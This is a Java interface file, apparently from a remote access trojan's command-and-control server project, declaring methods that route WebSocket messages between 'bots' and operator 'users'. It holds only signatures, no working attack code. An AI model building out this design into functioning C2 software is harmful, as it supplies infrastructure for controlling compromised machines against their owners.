package devs.alex.sah.rat.c2server.services;

import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.PongMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.nio.ByteBuffer;

public interface MessagesCoordinator {

     ServerEndpoint getServerEndpoint();

     void handleBotTextMessage(WebSocketSession session, TextMessage message);
     void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message);

     void handleUserTextMessage(WebSocketSession session, TextMessage message);
     void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message);

     void sendTextMessage(WebSocketSession session,String envelope, String message);
     void sendBinaryMessage(WebSocketSession session, String envelope, ByteBuffer payload);

     void handlePongMessage(WebSocketSession session, PongMessage message);
}
